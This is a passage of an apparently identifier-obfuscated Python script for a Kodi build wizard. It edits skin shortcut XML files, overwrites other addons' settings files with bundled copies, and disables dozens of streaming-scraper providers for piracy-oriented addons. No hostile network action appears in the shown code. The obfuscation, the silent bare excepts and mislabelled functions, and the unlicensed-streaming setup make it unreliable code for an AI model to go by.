    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1194
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1197
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1198
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1202
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1203
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1204
    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1222
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1225
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1226
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1230
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1231
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1232
    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1250
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1253
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1254
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1258
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1259
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1260
    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1278
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1281
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1282
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1285
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1286
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1287
    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1305
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1308
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1309
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1311
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1312
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1313
    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1331
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1334
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1335
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1337
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1338
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1339
    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1357
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1360
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1361
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1364
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1365
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1366
    O000O000O0O00O000 =O000O000O0O00O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1384
    with open (OOOOO000O0OOOOOOO ,'w')as OOO0O00OO0OO0OOO0 :#line:1387
      OOO0O00OO0OO0OOO0 .write (O000O000O0O00O000 )#line:1388
def rdbuildinstallON ():#line:1391
    try :#line:1393
       O0OOO00O0000OOO00 =ADDONPATH +"/resources/rd/victory.xml"#line:1394
       O0O0000O00000O0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1395
       copyfile (O0OOO00O0000OOO00 ,O0O0000O00000O0OO )#line:1397
       O0OOO00O0000OOO00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1399
       O0O0000O00000O0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1400
       copyfile (O0OOO00O0000OOO00 ,O0O0000O00000O0OO )#line:1402
       O0OOO00O0000OOO00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1404
       O0O0000O00000O0OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1405
       copyfile (O0OOO00O0000OOO00 ,O0O0000O00000O0OO )#line:1407
       O0OOO00O0000OOO00 =ADDONPATH +"/resources/rd/Splash.png"#line:1410
       O0O0000O00000O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1411
       copyfile (O0OOO00O0000OOO00 ,O0O0000O00000O0OO )#line:1413
    except :#line:1415
       pass #line:1416
def rdbuild ():#line:1426
	OO00OO000OO0OO000 =(ADDON .getSetting ("auto_rd"))#line:1427
	if OO00OO000OO0OO000 =='true':#line:1428
		OO0O0O0OOO00O00OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1429
		OO0O0O0OOO00O00OO .setSetting ('all_t','0')#line:1430
		OO0O0O0OOO00O00OO .setSetting ('rd_menu_enable','false')#line:1431
		OO0O0O0OOO00O00OO .setSetting ('magnet_bay','false')#line:1432
		OO0O0O0OOO00O00OO .setSetting ('magnet_extra','false')#line:1433
		OO0O0O0OOO00O00OO .setSetting ('rd_only','false')#line:1434
		OO0O0O0OOO00O00OO .setSetting ('ftp','false')#line:1436
		OO0O0O0OOO00O00OO .setSetting ('fp','false')#line:1437
		OO0O0O0OOO00O00OO .setSetting ('filter_fp','false')#line:1438
		OO0O0O0OOO00O00OO .setSetting ('fp_size_en','false')#line:1439
		OO0O0O0OOO00O00OO .setSetting ('afdah','false')#line:1440
		OO0O0O0OOO00O00OO .setSetting ('ap2s','false')#line:1441
		OO0O0O0OOO00O00OO .setSetting ('cin','false')#line:1442
		OO0O0O0OOO00O00OO .setSetting ('clv','false')#line:1443
		OO0O0O0OOO00O00OO .setSetting ('cmv','false')#line:1444
		OO0O0O0OOO00O00OO .setSetting ('dl20','false')#line:1445
		OO0O0O0OOO00O00OO .setSetting ('esc','false')#line:1446
		OO0O0O0OOO00O00OO .setSetting ('extra','false')#line:1447
		OO0O0O0OOO00O00OO .setSetting ('film','false')#line:1448
		OO0O0O0OOO00O00OO .setSetting ('fre','false')#line:1449
		OO0O0O0OOO00O00OO .setSetting ('fxy','false')#line:1450
		OO0O0O0OOO00O00OO .setSetting ('genv','false')#line:1451
		OO0O0O0OOO00O00OO .setSetting ('getgo','false')#line:1452
		OO0O0O0OOO00O00OO .setSetting ('gold','false')#line:1453
		OO0O0O0OOO00O00OO .setSetting ('gona','false')#line:1454
		OO0O0O0OOO00O00OO .setSetting ('hdmm','false')#line:1455
		OO0O0O0OOO00O00OO .setSetting ('hdt','false')#line:1456
		OO0O0O0OOO00O00OO .setSetting ('icy','false')#line:1457
		OO0O0O0OOO00O00OO .setSetting ('ind','false')#line:1458
		OO0O0O0OOO00O00OO .setSetting ('iwi','false')#line:1459
		OO0O0O0OOO00O00OO .setSetting ('jen_free','false')#line:1460
		OO0O0O0OOO00O00OO .setSetting ('kiss','false')#line:1461
		OO0O0O0OOO00O00OO .setSetting ('lavin','false')#line:1462
		OO0O0O0OOO00O00OO .setSetting ('los','false')#line:1463
		OO0O0O0OOO00O00OO .setSetting ('m4u','false')#line:1464
		OO0O0O0OOO00O00OO .setSetting ('mesh','false')#line:1465
		OO0O0O0OOO00O00OO .setSetting ('mf','false')#line:1466
		OO0O0O0OOO00O00OO .setSetting ('mkvc','false')#line:1467
		OO0O0O0OOO00O00OO .setSetting ('mjy','false')#line:1468
		OO0O0O0OOO00O00OO .setSetting ('hdonline','false')#line:1469
		OO0O0O0OOO00O00OO .setSetting ('moviex','false')#line:1470
		OO0O0O0OOO00O00OO .setSetting ('mpr','false')#line:1471
		OO0O0O0OOO00O00OO .setSetting ('mvg','false')#line:1472
		OO0O0O0OOO00O00OO .setSetting ('mvl','false')#line:1473
		OO0O0O0OOO00O00OO .setSetting ('mvs','false')#line:1474
		OO0O0O0OOO00O00OO .setSetting ('myeg','false')#line:1475
		OO0O0O0OOO00O00OO .setSetting ('ninja','false')#line:1476
		OO0O0O0OOO00O00OO .setSetting ('odb','false')#line:1477
		OO0O0O0OOO00O00OO .setSetting ('ophd','false')#line:1478
		OO0O0O0OOO00O00OO .setSetting ('pks','false')#line:1479
		OO0O0O0OOO00O00OO .setSetting ('prf','false')#line:1480
		OO0O0O0OOO00O00OO .setSetting ('put18','false')#line:1481
		OO0O0O0OOO00O00OO .setSetting ('req','false')#line:1482
		OO0O0O0OOO00O00OO .setSetting ('rftv','false')#line:1483
		OO0O0O0OOO00O00OO .setSetting ('rltv','false')#line:1484
		OO0O0O0OOO00O00OO .setSetting ('sc','false')#line:1485
		OO0O0O0OOO00O00OO .setSetting ('seehd','false')#line:1486
		OO0O0O0OOO00O00OO .setSetting ('showbox','false')#line:1487
		OO0O0O0OOO00O00OO .setSetting ('shuid','false')#line:1488
		OO0O0O0OOO00O00OO .setSetting ('sil_gh','false')#line:1489
		OO0O0O0OOO00O00OO .setSetting ('spv','false')#line:1490
		OO0O0O0OOO00O00OO .setSetting ('subs','false')#line:1491
		OO0O0O0OOO00O00OO .setSetting ('tvs','false')#line:1492
		OO0O0O0OOO00O00OO .setSetting ('tw','false')#line:1493
		OO0O0O0OOO00O00OO .setSetting ('upto','false')#line:1494
		OO0O0O0OOO00O00OO .setSetting ('vel','false')#line:1495
		OO0O0O0OOO00O00OO .setSetting ('vex','false')#line:1496
		OO0O0O0OOO00O00OO .setSetting ('vidc','false')#line:1497
		OO0O0O0OOO00O00OO .setSetting ('w4hd','false')#line:1498
		OO0O0O0OOO00O00OO .setSetting ('wav','false')#line:1499
		OO0O0O0OOO00O00OO .setSetting ('wf','false')#line:1500
		OO0O0O0OOO00O00OO .setSetting ('wse','false')#line:1501
		OO0O0O0OOO00O00OO .setSetting ('wss','false')#line:1502
		OO0O0O0OOO00O00OO .setSetting ('wsse','false')#line:1503
		OO0O0O0OOO00O00OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1504
		OO0O0O0OOO00O00OO .setSetting ('debrid.only','true')#line:1505
		OO0O0O0OOO00O00OO .setSetting ('hosts.captcha','false')#line:1506
		OO0O0O0OOO00O00OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1507
		OO0O0O0OOO00O00OO .setSetting ('provider.123moviehd','false')#line:1508
		OO0O0O0OOO00O00OO .setSetting ('provider.300mbdownload','false')#line:1509
		OO0O0O0OOO00O00OO .setSetting ('provider.alltube','false')#line:1510
		OO0O0O0OOO00O00OO .setSetting ('provider.allucde','false')#line:1511
		OO0O0O0OOO00O00OO .setSetting ('provider.animebase','false')#line:1512
		OO0O0O0OOO00O00OO .setSetting ('provider.animeloads','false')#line:1513
		OO0O0O0OOO00O00OO .setSetting ('provider.animetoon','false')#line:1514
		OO0O0O0OOO00O00OO .setSetting ('provider.bnwmovies','false')#line:1515
		OO0O0O0OOO00O00OO .setSetting ('provider.boxfilm','false')#line:1516
		OO0O0O0OOO00O00OO .setSetting ('provider.bs','false')#line:1517
		OO0O0O0OOO00O00OO .setSetting ('provider.cartoonhd','false')#line:1518
		OO0O0O0OOO00O00OO .setSetting ('provider.cdahd','false')#line:1519
		OO0O0O0OOO00O00OO .setSetting ('provider.cdax','false')#line:1520
		OO0O0O0OOO00O00OO .setSetting ('provider.cine','false')#line:1521
		OO0O0O0OOO00O00OO .setSetting ('provider.cinenator','false')#line:1522
		OO0O0O0OOO00O00OO .setSetting ('provider.cmovieshdbz','false')#line:1523
		OO0O0O0OOO00O00OO .setSetting ('provider.coolmoviezone','false')#line:1524
		OO0O0O0OOO00O00OO .setSetting ('provider.ddl','false')#line:1525
		OO0O0O0OOO00O00OO .setSetting ('provider.deepmovie','false')#line:1526
		OO0O0O0OOO00O00OO .setSetting ('provider.ekinomaniak','false')#line:1527
		OO0O0O0OOO00O00OO .setSetting ('provider.ekinotv','false')#line:1528
		OO0O0O0OOO00O00OO .setSetting ('provider.filiser','false')#line:1529
		OO0O0O0OOO00O00OO .setSetting ('provider.filmpalast','false')#line:1530
		OO0O0O0OOO00O00OO .setSetting ('provider.filmwebbooster','false')#line:1531
		OO0O0O0OOO00O00OO .setSetting ('provider.filmxy','false')#line:1532
		OO0O0O0OOO00O00OO .setSetting ('provider.fmovies','false')#line:1533
		OO0O0O0OOO00O00OO .setSetting ('provider.foxx','false')#line:1534
		OO0O0O0OOO00O00OO .setSetting ('provider.freefmovies','false')#line:1535
		OO0O0O0OOO00O00OO .setSetting ('provider.freeputlocker','false')#line:1536
		OO0O0O0OOO00O00OO .setSetting ('provider.furk','false')#line:1537
		OO0O0O0OOO00O00OO .setSetting ('provider.gamatotv','false')#line:1538
		OO0O0O0OOO00O00OO .setSetting ('provider.gogoanime','false')#line:1539
		OO0O0O0OOO00O00OO .setSetting ('provider.gowatchseries','false')#line:1540
		OO0O0O0OOO00O00OO .setSetting ('provider.hackimdb','false')#line:1541
		OO0O0O0OOO00O00OO .setSetting ('provider.hdfilme','false')#line:1542
		OO0O0O0OOO00O00OO .setSetting ('provider.hdmto','false')#line:1543
		OO0O0O0OOO00O00OO .setSetting ('provider.hdpopcorns','false')#line:1544
		OO0O0O0OOO00O00OO .setSetting ('provider.hdstreams','false')#line:1545
		OO0O0O0OOO00O00OO .setSetting ('provider.horrorkino','false')#line:1547
		OO0O0O0OOO00O00OO .setSetting ('provider.iitv','false')#line:1548
		OO0O0O0OOO00O00OO .setSetting ('provider.iload','false')#line:1549
		OO0O0O0OOO00O00OO .setSetting ('provider.iwaatch','false')#line:1550
		OO0O0O0OOO00O00OO .setSetting ('provider.kinodogs','false')#line:1551
		OO0O0O0OOO00O00OO .setSetting ('provider.kinoking','false')#line:1552
		OO0O0O0OOO00O00OO .setSetting ('provider.kinow','false')#line:1553
		OO0O0O0OOO00O00OO .setSetting ('provider.kinox','false')#line:1554
		OO0O0O0OOO00O00OO .setSetting ('provider.lichtspielhaus','false')#line:1555
		OO0O0O0OOO00O00OO .setSetting ('provider.liomenoi','false')#line:1556
		OO0O0O0OOO00O00OO .setSetting ('provider.magnetdl','false')#line:1559
		OO0O0O0OOO00O00OO .setSetting ('provider.megapelistv','false')#line:1560
		OO0O0O0OOO00O00OO .setSetting ('provider.movie2k-ac','false')#line:1561
		OO0O0O0OOO00O00OO .setSetting ('provider.movie2k-ag','false')#line:1562
		OO0O0O0OOO00O00OO .setSetting ('provider.movie2z','false')#line:1563
		OO0O0O0OOO00O00OO .setSetting ('provider.movie4k','false')#line:1564
		OO0O0O0OOO00O00OO .setSetting ('provider.movie4kis','false')#line:1565
		OO0O0O0OOO00O00OO .setSetting ('provider.movieneo','false')#line:1566
		OO0O0O0OOO00O00OO .setSetting ('provider.moviesever','false')#line:1567
		OO0O0O0OOO00O00OO .setSetting ('provider.movietown','false')#line:1568
		OO0O0O0OOO00O00OO .setSetting ('provider.mvrls','false')#line:1570
		OO0O0O0OOO00O00OO .setSetting ('provider.netzkino','false')#line:1571
		OO0O0O0OOO00O00OO .setSetting ('provider.odb','false')#line:1572
		OO0O0O0OOO00O00OO .setSetting ('provider.openkatalog','false')#line:1573
		OO0O0O0OOO00O00OO .setSetting ('provider.ororo','false')#line:1574
		OO0O0O0OOO00O00OO .setSetting ('provider.paczamy','false')#line:1575
		OO0O0O0OOO00O00OO .setSetting ('provider.peliculasdk','false')#line:1576
		OO0O0O0OOO00O00OO .setSetting ('provider.pelisplustv','false')#line:1577
		OO0O0O0OOO00O00OO .setSetting ('provider.pepecine','false')#line:1578
		OO0O0O0OOO00O00OO .setSetting ('provider.primewire','false')#line:1579
		OO0O0O0OOO00O00OO .setSetting ('provider.projectfreetv','false')#line:1580
		OO0O0O0OOO00O00OO .setSetting ('provider.proxer','false')#line:1581
		OO0O0O0OOO00O00OO .setSetting ('provider.pureanime','false')#line:1582
		OO0O0O0OOO00O00OO .setSetting ('provider.putlocker','false')#line:1583
		OO0O0O0OOO00O00OO .setSetting ('provider.putlockerfree','false')#line:1584
		OO0O0O0OOO00O00OO .setSetting ('provider.reddit','false')#line:1585
		OO0O0O0OOO00O00OO .setSetting ('provider.cartoonwire','false')#line:1586
		OO0O0O0OOO00O00OO .setSetting ('provider.seehd','false')#line:1587
		OO0O0O0OOO00O00OO .setSetting ('provider.segos','false')#line:1588
		OO0O0O0OOO00O00OO .setSetting ('provider.serienstream','false')#line:1589
		OO0O0O0OOO00O00OO .setSetting ('provider.series9','false')#line:1590
		OO0O0O0OOO00O00OO .setSetting ('provider.seriesever','false')#line:1591
		OO0O0O0OOO00O00OO .setSetting ('provider.seriesonline','false')#line:1592
		OO0O0O0OOO00O00OO .setSetting ('provider.seriespapaya','false')#line:1593
		OO0O0O0OOO00O00OO .setSetting ('provider.sezonlukdizi','false')#line:1594
		OO0O0O0OOO00O00OO .setSetting ('provider.solarmovie','false')#line:1595
		OO0O0O0OOO00O00OO .setSetting ('provider.solarmoviez','false')#line:1596
		OO0O0O0OOO00O00OO .setSetting ('provider.stream-to','false')#line:1597
		OO0O0O0OOO00O00OO .setSetting ('provider.streamdream','false')#line:1598
		OO0O0O0OOO00O00OO .setSetting ('provider.streamflix','false')#line:1599
		OO0O0O0OOO00O00OO .setSetting ('provider.streamit','false')#line:1600
		OO0O0O0OOO00O00OO .setSetting ('provider.swatchseries','false')#line:1601
		OO0O0O0OOO00O00OO .setSetting ('provider.szukajkatv','false')#line:1602
		OO0O0O0OOO00O00OO .setSetting ('provider.tainiesonline','false')#line:1603
		OO0O0O0OOO00O00OO .setSetting ('provider.tainiomania','false')#line:1604
		OO0O0O0OOO00O00OO .setSetting ('provider.tata','false')#line:1607
		OO0O0O0OOO00O00OO .setSetting ('provider.trt','false')#line:1608
		OO0O0O0OOO00O00OO .setSetting ('provider.tvbox','false')#line:1609
		OO0O0O0OOO00O00OO .setSetting ('provider.ultrahd','false')#line:1610
		OO0O0O0OOO00O00OO .setSetting ('provider.video4k','false')#line:1611
		OO0O0O0OOO00O00OO .setSetting ('provider.vidics','false')#line:1612
		OO0O0O0OOO00O00OO .setSetting ('provider.view4u','false')#line:1613
		OO0O0O0OOO00O00OO .setSetting ('provider.watchseries','false')#line:1614
		OO0O0O0OOO00O00OO .setSetting ('provider.xrysoi','false')#line:1615
		OO0O0O0OOO00O00OO .setSetting ('provider.library','false')#line:1616
def fixfont ():#line:1619
	O00O00O000O000O00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1620
	OOOO000000OO00000 =json .loads (O00O00O000O000O00 );#line:1622
	O0O0OO0O000O00OO0 =OOOO000000OO00000 ["result"]["settings"]#line:1623
	O0OOOOOO0000OOO00 =[O0OOOO00OOO000O00 for O0OOOO00OOO000O00 in O0O0OO0O000O00OO0 if O0OOOO00OOO000O00 ["id"]=="audiooutput.audiodevice"][0 ]#line:1625
	OO000O0OOOOO00OO0 =O0OOOOOO0000OOO00 ["options"];#line:1626
	O000O0OO00O00O0OO =O0OOOOOO0000OOO00 ["value"];#line:1627
	O000000O0000OO000 =[O0000O0O0OO00O000 for (O0000O0O0OO00O000 ,OOO0O0OO0O00O000O )in enumerate (OO000O0OOOOO00OO0 )if OOO0O0OO0O00O000O ["value"]==O000O0OO00O00O0OO ][0 ];#line:1629
	O0000000O00O0O000 =(O000000O0000OO000 +1 )%len (OO000O0OOOOO00OO0 )#line:1631
	OOOO0OOO0OOO0OOOO =OO000O0OOOOO00OO0 [O0000000O00O0O000 ]["value"]#line:1633
	OOO0O0OO0O00000OO =OO000O0OOOOO00OO0 [O0000000O00O0O000 ]["label"]#line:1634
	O0O00O00O00OOOO0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1636
	try :#line:1638
		OO000O00O0OO0OO00 =json .loads (O0O00O00O00OOOO0O );#line:1639
		if OO000O00O0OO0OO00 ["result"]!=True :#line:1641
			raise Exception #line:1642
	except :#line:1643
		sys .stderr .write ("Error switching audio output device")#line:1644
		raise Exception #line:1645
def parseDOM2 (OOO00OOOO00OOOOOO ,name =u"",attrs ={},ret =False ):#line:1646
	if isinstance (OOO00OOOO00OOOOOO ,str ):#line:1649
		try :#line:1650
			OOO00OOOO00OOOOOO =[OOO00OOOO00OOOOOO .decode ("utf-8")]#line:1651
		except :#line:1652
			OOO00OOOO00OOOOOO =[OOO00OOOO00OOOOOO ]#line:1653
	elif isinstance (OOO00OOOO00OOOOOO ,unicode ):#line:1654
		OOO00OOOO00OOOOOO =[OOO00OOOO00OOOOOO ]#line:1655
	elif not isinstance (OOO00OOOO00OOOOOO ,list ):#line:1656
		return u""#line:1657
	if not name .strip ():#line:1659
		return u""#line:1660
	OO0000O0OO0OO0OO0 =[]#line:1662
	for O00O0O0OO0OO0O0O0 in OOO00OOOO00OOOOOO :#line:1663
		OOOO0O0OOOO0OO00O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00O0O0OO0OO0O0O0 )#line:1664
		for OO0OO0OO0OO0OO0O0 in OOOO0O0OOOO0OO00O :#line:1665
			O00O0O0OO0OO0O0O0 =O00O0O0OO0OO0O0O0 .replace (OO0OO0OO0OO0OO0O0 ,OO0OO0OO0OO0OO0O0 .replace ("\n"," "))#line:1666
		O0000O00O00O0OO0O =[]#line:1668
		for OOOO00O00OO0OO0O0 in attrs :#line:1669
			O00OO0OO0000OOOO0 =re .compile ('(<'+name +'[^>]*?(?:'+OOOO00O00OO0OO0O0 +'=[\'"]'+attrs [OOOO00O00OO0OO0O0 ]+'[\'"].*?>))',re .M |re .S ).findall (O00O0O0OO0OO0O0O0 )#line:1670
			if len (O00OO0OO0000OOOO0 )==0 and attrs [OOOO00O00OO0OO0O0 ].find (" ")==-1 :#line:1671
				O00OO0OO0000OOOO0 =re .compile ('(<'+name +'[^>]*?(?:'+OOOO00O00OO0OO0O0 +'='+attrs [OOOO00O00OO0OO0O0 ]+'.*?>))',re .M |re .S ).findall (O00O0O0OO0OO0O0O0 )#line:1672
			if len (O0000O00O00O0OO0O )==0 :#line:1674
				O0000O00O00O0OO0O =O00OO0OO0000OOOO0 #line:1675
				O00OO0OO0000OOOO0 =[]#line:1676
			else :#line:1677
				OOO00O0000O0OOOOO =range (len (O0000O00O00O0OO0O ))#line:1678
				OOO00O0000O0OOOOO .reverse ()#line:1679
				for OOOOO000OO0O000OO in OOO00O0000O0OOOOO :#line:1680
					if not O0000O00O00O0OO0O [OOOOO000OO0O000OO ]in O00OO0OO0000OOOO0 :#line:1681
						del (O0000O00O00O0OO0O [OOOOO000OO0O000OO ])#line:1682
		if len (O0000O00O00O0OO0O )==0 and attrs =={}:#line:1684
			O0000O00O00O0OO0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00O0O0OO0OO0O0O0 )#line:1685
			if len (O0000O00O00O0OO0O )==0 :#line:1686
				O0000O00O00O0OO0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00O0O0OO0OO0O0O0 )#line:1687
		if isinstance (ret ,str ):#line:1689
			O00OO0OO0000OOOO0 =[]#line:1690
			for OO0OO0OO0OO0OO0O0 in O0000O00O00O0OO0O :#line:1691
				OOO0O000O0OO0O0O0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0OO0OO0OO0OO0O0 )#line:1692
